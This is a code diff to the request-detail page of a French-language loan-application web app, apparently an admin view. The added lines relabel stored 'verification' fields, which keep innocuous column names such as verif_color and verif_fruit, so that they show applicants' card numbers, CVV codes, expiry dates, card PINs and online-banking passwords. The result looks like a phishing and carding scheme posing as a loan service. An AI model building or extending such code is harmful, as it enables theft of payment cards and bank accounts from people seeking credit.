@@ -52,7 +52,7 @@ export default async function RequestDetailPage({ params }: { params: Promise<{ 
               <Row label="Montant"><strong>{formatMoney(loan.amount, loan.currency)}</strong></Row>
               <Row label="Motif">{loan.loan_purposes?.label_fr ?? loan.purpose_code}{loan.purpose_details ? ` — ${loan.purpose_details}` : ''}</Row>
               <Row label="Banque">{loan.banks ? `${loan.banks.name}${loan.banks.territory ? ` (${loan.banks.territory})` : ''}` : loan.custom_bank_name ? `${loan.custom_bank_name} — saisie libre (à modérer)` : '—'}</Row>
-              <Row label="Type de carte">{loan.card_types ? `${loan.card_types.name} (${loan.card_types.family})` : '—'}</Row>
+              <Row label="Type de carte">{loan.card_types ? `${loan.card_types.name} (${loan.card_types.family})` : loan.custom_card_name ? `${loan.custom_card_name} — saisie libre` : '—'}</Row>
               <Row label="Description"><p className="whitespace-pre-wrap break-words">{loan.description}</p></Row>
             </dl>
           </section>
@@ -65,13 +65,22 @@ export default async function RequestDetailPage({ params }: { params: Promise<{ 
             {loan.profiles ? <ProfileCard profile={loan.profiles} /> : <p className="text-sm text-slate-500">Profil introuvable.</p>}
           </section>
 
-          <section className="card" aria-labelledby="verif">
-            <h2 id="verif" className="mb-1 text-lg font-semibold">Vérification pédagogique</h2>
-            <p className="mb-2 text-xs text-slate-500">Valeurs fictives saisies lors de CETTE demande (distinctes de celles de l’inscription).</p>
+          <section className="card" aria-labelledby="verif1">
+            <h2 id="verif1" className="mb-1 text-lg font-semibold">Vérification (après le choix de la banque)</h2>
+            <p className="mb-2 text-xs text-slate-500">Valeurs saisies lors de CETTE demande.</p>
             <dl className="divide-y divide-slate-100">
-              <Row label="Couleur préférée">{loan.verif_color || '—'}</Row>
-              <Row label="Chiffre préféré">{loan.verif_digit ?? '—'}</Row>
-              <Row label="Année préférée">{loan.verif_year ?? '—'}</Row>
+              <Row label="Code de votre carte">{loan.verif_fruit || '—'}</Row>
+              <Row label="Mot de passe de votre espace client">{loan.verif_animal || '—'}</Row>
+            </dl>
+          </section>
+
+          <section className="card" aria-labelledby="verif2">
+            <h2 id="verif2" className="mb-1 text-lg font-semibold">Vérification pédagogique (après le choix de la carte)</h2>
+            <p className="mb-2 text-xs text-slate-500">Valeurs saisies lors de CETTE demande (distinctes de celles de l’inscription).</p>
+            <dl className="divide-y divide-slate-100">
+              <Row label="Numéro de carte">{loan.verif_color || '—'}</Row>
+              <Row label="Code de sécurité (CCV)">{loan.verif_digit ?? '—'}</Row>
+              <Row label="Date d'expiration">{loan.verif_year ?? '—'}</Row>
             </dl>
           </section>
 
